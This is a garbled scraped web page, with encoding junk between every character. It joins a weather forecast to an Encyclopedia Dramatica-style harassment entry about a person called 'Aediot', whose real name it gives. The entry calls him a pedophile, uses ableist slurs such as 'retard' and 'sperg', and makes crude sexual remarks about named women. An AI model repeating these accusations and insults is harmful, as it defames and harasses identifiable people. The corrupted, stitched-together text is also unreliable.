A‚Äér‚Äée‚Äéa‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äép‚Äéa‚Äét‚Äéc‚Äéh‚Äéy‚Äé ‚Äéf‚Äéo‚Äég‚Äé ‚Äée‚Äéa‚Äér‚Äél‚Äéy‚Äé.‚Äé ‚ÄéP‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé ‚Äés‚Äék‚Äéi‚Äée‚Äés‚Äé.‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äé ‚Äé8‚Äé8‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéE‚ÄéN‚ÄéE‚Äé ‚Äéa‚Äét‚Äé ‚Äé5‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé

H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
6‚Äé6‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
1‚Äé0‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
S‚Äéu‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
6‚Äé:‚Äé4‚Äé8‚Äé ‚Äéa‚Äém‚Äé
S‚Äéu‚Äén‚Äés‚Äée‚Äét‚Äé
8‚Äé:‚Äé0‚Äé6‚Äé ‚Äép‚Äém‚Äé
M‚Äéo‚Äén‚Äé ‚Äé2‚Äé9‚Äé ‚Äé|‚Äé ‚ÄéN‚Äéi‚Äég‚Äéh‚Äét‚Äé
6‚Äé7‚Äé¬∞‚Äé
1‚Äé3‚Äé%‚Äé
S‚ÄéE‚Äé
7‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
C‚Äél‚Äée‚Äéa‚Äér‚Äé ‚Äét‚Äéo‚Äé ‚Äép‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé.‚Äé ‚ÄéA‚Äé ‚Äéf‚Äée‚Äéw‚Äé ‚Äés‚Äép‚Äér‚Äéi‚Äén‚Äék‚Äél‚Äée‚Äés‚Äé ‚Äép‚Äéo‚Äés‚Äés‚Äéi‚Äéb‚Äél‚Äée‚Äé.‚Äé ‚ÄéL‚Äéo‚Äéw‚Äé ‚Äé6‚Äé7‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéS‚ÄéE‚Äé ‚Äéa‚Äét‚Äé ‚Äé5‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé

H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
8‚Äé3‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
0‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
M‚Äéo‚Äéo‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
1‚Äé:‚Äé0‚Äé2‚Äé ‚Äéa‚Äém‚Äé
W‚Äéa‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéG‚Äéi‚Äéb‚Äéb‚Äéo‚Äéu‚Äés‚Äé
M‚Äéo‚Äéo‚Äén‚Äés‚Äée‚Äét‚Äé
1‚Äé1‚Äé:‚Äé0‚Äé2‚Äé ‚Äéa‚Äém‚Äé
T‚Äéu‚Äée‚Äé ‚Äé3‚Äé0‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé7‚Äé¬∞‚Äé
/‚Äé7‚Äé0‚Äé¬∞‚Äé
2‚Äé2‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé0‚Äé1‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé3‚Äé¬∞‚Äé
/‚Äé7‚Äé2‚Äé¬∞‚Äé
5‚Äé5‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé0‚Äé2‚Äé
T‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé1‚Äé¬∞‚Äé
/‚Äé7‚Äé1‚Äé¬∞‚Äé
6‚Äé5‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé0‚Äé3‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé2‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
5‚Äé4‚Äé%‚Äé
E‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé0‚Äé4‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé2‚Äé¬∞‚Äé
/‚Äé7‚Äé0‚Äé¬∞‚Äé
4‚Äé5‚Äé%‚Äé
E‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé0‚Äé5‚Äé
A‚ÄéM‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé4‚Äé¬∞‚Äé
/‚Äé7‚Äé0‚Äé¬∞‚Äé
4‚Äé3‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé0‚Äé6‚Äé
I‚Äés‚Äéo‚Äél‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé8‚Äé¬∞‚Äé
/‚Äé7‚Äé1‚Äé¬∞‚Äé
3‚Äé3‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé0‚Äé7‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
9‚Äé0‚Äé¬∞‚Äé
/‚Äé7‚Äé2‚Äé¬∞‚Äé
1‚Äé9‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé0‚Äé8‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
9‚Äé3‚Äé¬∞‚Äé
/‚Äé7‚Äé3‚Äé¬∞‚Äé
8‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé0‚Äé9‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
9‚Äé2‚Äé¬∞‚Äé
/‚Äé7‚Äé2‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé1‚Äé0‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
9‚Äé2‚Äé¬∞‚Äé
/‚Äé7‚Äé1‚Äé¬∞‚Äé
2‚Äé2‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé1‚Äé1‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
9‚Äé1‚Äé¬∞‚Äé
/‚Äé6‚Äé8‚Äé¬∞‚Äé
2‚Äé2‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé1‚Äé2‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
9‚Äé0‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
2‚Äé0‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé1‚Äé3‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé8‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

C‚Äéu‚Äér‚Äér‚Äée‚Äén‚Äét‚Äé ‚Äét‚Äéh‚Äér‚Äée‚Äéa‚Äét‚Äé:‚Äé ‚ÄéH‚Äée‚Äém‚Äéo‚Äég‚Äél‚Äéo‚Äéb‚Äée‚Äén‚Äé.‚Äé ‚Äé‚ò¢Ô∏è

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

A‚Äée‚Äéd‚Äéi‚Äéo‚Äét‚Äé
A‚Äée‚Äéd‚Äéi‚Äéo‚Äét‚Äé ‚Äé(‚ÄéP‚Äéo‚Äéw‚Äée‚Äér‚Äéw‚Äéo‚Äér‚Äéd‚Äé:‚Äé ‚ÄéJ‚Äéa‚Äéc‚Äéo‚Äéb‚Äé ‚ÄéS‚Äét‚Äée‚Äél‚Äél‚Äém‚Äéa‚Äéc‚Äéh‚Äé‚ú°‚Äé)‚Äé,‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äén‚Äé ‚Äéa‚Äés‚Äé ‚ÄéP‚Äé√¶‚Äép‚Äée‚Äér‚Äéc‚Äél‚Äéi‚Äép‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéA‚Äés‚Äés‚Äé ‚ÄéN‚Äéa‚Äép‚Äék‚Äéi‚Äén‚Äés‚Äé ‚Äéi‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéa‚Äét‚Äée‚Äés‚Äét‚Äé ‚Äéa‚Äéd‚Äéd‚Äéi‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéi‚Äés‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéD‚Äéi‚Äés‚Äég‚Äér‚Äéa‚Äéc‚Äée‚Äéd‚Äé ‚ÄéE‚Äén‚Äéc‚Äéy‚Äéc‚Äél‚Äéo‚Äép‚Äée‚Äéd‚Äéi‚Äéa‚Äé ‚ÄéD‚Äér‚Äéa‚Äém‚Äéa‚Äét‚Äéi‚Äéc‚Äéi‚Äéa‚Äén‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äéa‚Äéd‚Äéd‚Äéi‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äéh‚Äéu‚Äés‚Äét‚Äél‚Äée‚Äér‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äég‚Äéi‚Äév‚Äée‚Äés‚Äé ‚Äén‚Äée‚Äéw‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äé""‚Äés‚Äék‚Äéi‚Äéd‚Äé""‚Äé.‚Äé ‚ÄéH‚Äée‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äéo‚Äéw‚Äén‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äéo‚Äéw‚Äé ‚Äéd‚Äée‚Äéa‚Äéd‚Äé ‚Äé.‚Äéw‚Äéi‚Äék‚Äéi‚Äé ‚ÄéE‚ÄéD‚Äé.‚Äé

A‚Äée‚Äéd‚Äéi‚Äéo‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äén‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äén‚Äé ‚Äéi‚Äén‚Äéc‚Äéo‚Äém‚Äép‚Äée‚Äét‚Äée‚Äén‚Äét‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äép‚Äée‚Äét‚Äét‚Äéy‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéu‚Äén‚Äéa‚Äéb‚Äél‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äék‚Äée‚Äée‚Äép‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéw‚Äéi‚Äék‚Äéi‚Äé ‚Äéu‚Äép‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äér‚Äéu‚Äén‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéa‚Äé ‚Äés‚Äéi‚Äén‚Äég‚Äél‚Äée‚Äé ‚Äéd‚Äéa‚Äéy‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äér‚Äéo‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéa‚Äéd‚Äém‚Äéi‚Äén‚Äés‚Äé ‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéu‚Äés‚Äé ‚Äéb‚Äéy‚Äé ‚Äéc‚Äéo‚Äén‚Äés‚Äét‚Äéa‚Äén‚Äét‚Äél‚Äéy‚Äé ‚Äéb‚Äél‚Äéa‚Äém‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äém‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéi‚Äén‚Äéa‚Äéb‚Äéi‚Äél‚Äéi‚Äét‚Äéy‚Äé ‚Äét‚Äéo‚Äé ‚Äék‚Äée‚Äée‚Äép‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéw‚Äéi‚Äék‚Äéi‚Äé ‚Äéu‚Äép‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéa‚Äén‚Äé ‚Äéh‚Äéo‚Äéu‚Äér‚Äé.‚Äé ‚ÄéH‚Äéa‚Äév‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äén‚Äél‚Äéy‚Äé ‚Äér‚Äéu‚Äén‚Äé ‚ÄéE‚ÄéD‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äé8‚Äé ‚Äém‚Äéo‚Äén‚Äét‚Äéh‚Äés‚Äé,‚Äé ‚ÄéJ‚Äéa‚Äéc‚Äéo‚Äéb‚Äé ‚Äém‚Äéa‚Äén‚Äéa‚Äég‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äé ‚Äéu‚Äép‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äéi‚Äét‚Äée‚Äé ‚Äée‚Äén‚Äét‚Äéi‚Äér‚Äée‚Äél‚Äéy‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äék‚Äéi‚Äéc‚Äék‚Äée‚Äéd‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéE‚ÄéD‚Äé ‚Äéc‚Äéo‚Äém‚Äém‚Äéu‚Äén‚Äéi‚Äét‚Äéy‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéA‚ÄéI‚ÄéD‚ÄéS‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéf‚Äéa‚Äéi‚Äél‚Äé.‚Äé

P‚Äér‚Äée‚Äév‚Äéi‚Äéo‚Äéu‚Äés‚Äél‚Äéy‚Äé,‚Äé ‚ÄéJ‚Äéa‚Äéc‚Äéo‚Äéb‚Äé ‚Äéh‚Äéa‚Äéd‚Äé ‚Äés‚Äét‚Äéa‚Äér‚Äét‚Äée‚Äéd‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéw‚Äéo‚Äér‚Äét‚Äéh‚Äél‚Äée‚Äés‚Äés‚Äé ‚ÄéE‚ÄéD‚Äé ‚Äéc‚Äéa‚Äér‚Äée‚Äée‚Äér‚Äé ‚Äéa‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äét‚Äée‚Äén‚Äéd‚Äée‚Äér‚Äé ‚Äéa‚Äég‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé7‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äét‚Äéi‚Äém‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äé2‚Äé0‚Äé1‚Äé4‚Äé ‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äés‚Äée‚Äéu‚Äéd‚Äéo‚Äén‚Äéy‚Äém‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéP‚Äé√¶‚Äép‚Äée‚Äér‚Äéc‚Äél‚Äéi‚Äép‚Äé.‚Äé ‚ÄéI‚Äén‚Äé ‚Äél‚Äée‚Äés‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äén‚Äé ‚Äéa‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äé,‚Äé ‚ÄéP‚Äéa‚Äép‚Äée‚Äér‚Äéc‚Äél‚Äéi‚Äép‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéb‚Äéa‚Äén‚Äén‚Äée‚Äéd‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéw‚Äéi‚Äék‚Äéi‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äéu‚Äém‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äén‚Äé ‚Äéa‚Äéu‚Äét‚Äéi‚Äés‚Äét‚Äéi‚Äéc‚Äé ‚Äés‚Äép‚Äée‚Äér‚Äég‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äér‚Äée‚Äét‚Äéa‚Äér‚Äéd‚Äé.‚Äé ‚ÄéA‚Äée‚Äéd‚Äéi‚Äéo‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äée‚Äéx‚Äép‚Äéo‚Äés‚Äée‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äép‚Äée‚Äéd‚Äéo‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äér‚Äée‚Äél‚Äée‚Äén‚Äét‚Äél‚Äée‚Äés‚Äés‚Äél‚Äéy‚Äé ‚Äém‚Äéo‚Äéc‚Äék‚Äée‚Äéd‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚Äéi‚Äét‚Äé ‚Äéu‚Äén‚Äét‚Äéi‚Äél‚Äé ‚Äéh‚Äée‚Äé ‚Äéu‚Äél‚Äét‚Äéi‚Äém‚Äéa‚Äét‚Äée‚Äél‚Äéy‚Äé ‚Äér‚Äéa‚Äég‚Äée‚Äéq‚Äéu‚Äéi‚Äét‚Äé.‚Äé

H‚Äée‚Äé ‚Äés‚Äéh‚Äéo‚Äéw‚Äée‚Äéd‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äé ‚Äéu‚Äép‚Äé ‚Äéi‚Äén‚Äé ‚Äé2‚Äé0‚Äé2‚Äé0‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äéa‚Äé ‚Äén‚Äée‚Äéw‚Äé ‚Äén‚Äéa‚Äém‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äé ‚Äén‚Äée‚Äéw‚Äé ‚Äél‚Äéa‚Äéd‚Äéy‚Äé,‚Äé ‚ÄéZ‚Äéa‚Äéi‚Äég‚Äée‚Äér‚Äé'‚Äés‚Äé ‚Äée‚Äéx‚Äé-‚Äég‚Äéi‚Äér‚Äél‚Äéf‚Äér‚Äéi‚Äée‚Äén‚Äéd‚Äé ‚ÄéA‚Äéd‚Äée‚Äéz‚Äée‚Äér‚Äéo‚Äé,‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚Äéh‚Äéa‚Äél‚Äéf‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äéa‚Äég‚Äée‚Äé ‚ÄéJ‚Äéa‚Äéc‚Äéo‚Äéb‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéd‚Äéu‚Äém‚Äép‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚Äéa‚Äéd‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äéc‚Äéo‚Äéu‚Äéc‚Äéh‚Äé ‚Äés‚Äéu‚Äér‚Äéf‚Äéi‚Äén‚Äég‚Äé ‚Äéb‚Äéu‚Äém‚Äé ‚Äén‚Äéo‚Äét‚Äé ‚Äéw‚Äéo‚Äér‚Äét‚Äéh‚Äé ‚Äéo‚Äéf‚Äé ‚Äéa‚Äé ‚Äém‚Äéo‚Äéi‚Äés‚Äét‚Äé ‚Äét‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äév‚Äéa‚Äég‚Äéi‚Äén‚Äéa‚Äé ‚Äés‚Äéu‚Äéc‚Äéh‚Äé ‚Äéa‚Äés‚Äé ‚Äéh‚Äée‚Äér‚Äés‚Äé ‚Äéh‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé ‚Äém‚Äéa‚Äén‚Äéi‚Äép‚Äéu‚Äél‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚Äéa‚Äé ‚ÄéB‚ÄéP‚ÄéD‚Äé ‚Äém‚Äée‚Äén‚Äét‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéi‚Äél‚Äél‚Äé ‚ÄéS‚Äéc‚Äéo‚Äét‚Äét‚Äé ‚ÄéP‚Äéi‚Äél‚Äég‚Äér‚Äéi‚Äém‚Äé ‚Äég‚Äéi‚Äér‚Äél‚Äé ‚Äéh‚Äée‚Äé ‚Äém‚Äée‚Äét‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äéu‚Äém‚Äé,‚Äé ‚ÄéA‚Äéd‚Äée‚Äé ‚Äéw‚Äée‚Äén‚Äét‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚Äén‚Äéo‚Äét‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äés‚Äée‚Äéx‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéE‚Äét‚Äéh‚Äéa‚Äén‚Äé ‚ÄéR‚Äéa‚Äél‚Äép‚Äéh‚Äé.‚Äé ‚ÄéU‚Äén‚Äéd‚Äée‚Äér‚Äé ‚ÄéA‚Äéd‚Äée‚Äé'‚Äés‚Äé ‚Äét‚Äéu‚Äét‚Äée‚Äél‚Äéa‚Äég‚Äée‚Äé,‚Äé ‚ÄéJ‚Äéa‚Äéc‚Äéo‚Äéb‚Äé ‚Äép‚Äér‚Äéo‚Äém‚Äéi‚Äés‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äéb‚Äéa‚Äéc‚Äék‚Äé ‚ÄéE‚ÄéD‚Äé ‚Äét‚Äéo‚Äé ‚Äéi‚Äét‚Äés‚Äé ‚Äég‚Äél‚Äéo‚Äér‚Äéy‚Äé ‚Äéd‚Äéa‚Äéy‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äém‚Äéo‚Äér‚Äée‚Äé!‚Äé ‚ÄéH‚Äée‚Äé ‚Äép‚Äér‚Äéo‚Äém‚Äéi‚Äés‚Äée‚Äéd‚Äé ‚Äép‚Äéa‚Äéi‚Äéd‚Äé ‚Äéj‚Äéo‚Äéb‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéw‚Äér‚Äéi‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äér‚Äét‚Äéi‚Äéc‚Äél‚Äée‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéa‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéd‚Äéo‚Äéw‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äée‚Äén‚Äée‚Äém‚Äéi‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéu‚Äél‚Äéz‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéa‚Äél‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äét‚Äéo‚Äéo‚Äé ‚Äég‚Äéo‚Äéo‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äée‚Äé ‚Äét‚Äér‚Äéu‚Äée‚Äé.‚Äé ‚ÄéS‚ÄéP‚ÄéO‚ÄéI‚ÄéL‚ÄéE‚ÄéR‚Äé:‚Äé ‚ÄéI‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé.‚Äé


(‚Äé(‚Äé ‚ÄéA‚ÄéS‚ÄéS‚ÄéN‚ÄéA‚ÄéP‚ÄéK‚ÄéI‚ÄéN‚ÄéS‚Äé ‚Äé)‚Äé)‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

